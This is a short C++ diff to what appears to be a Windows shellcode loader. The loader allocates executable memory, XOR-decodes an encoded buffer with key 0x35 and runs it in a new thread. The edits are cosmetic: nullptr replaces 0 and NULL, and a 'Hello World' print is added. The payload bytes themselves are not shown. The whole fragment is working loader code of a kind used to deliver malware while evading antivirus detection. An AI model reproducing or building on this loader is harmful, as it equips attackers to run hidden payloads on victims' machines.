@@ -69,8 +69,8 @@ void main()
         return 0;
     }
 
-    PVOID shell_exec = VirtualAlloc(0, sizeof(buf1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (shell_exec == 0) {
+    PVOID shell_exec = VirtualAlloc(nullptr, sizeof(buf1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (shell_exec == nullptr) {
         std::cerr << "pointer is zero";
     }
     else {
@@ -81,14 +81,15 @@ void main()
             ((char*)shell_exec)[i] = (((char*)shell_exec)[i]) ^ '\x35';
         }
 
-        HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shell_exec, NULL, 0, &threadID);
-        if (hThread == 0) {
+        HANDLE hThread = CreateThread(nullptr, 0, (PTHREAD_START_ROUTINE)shell_exec, NULL, 0, &threadID);
+        if (hThread == nullptr) {
             std::cerr << "thread is zero";
         }
         else {
             WaitForSingleObject(hThread, INFINITE);
         }
     };
+    std::cout << "Hello World" << std::endl;
     return;
 }
 
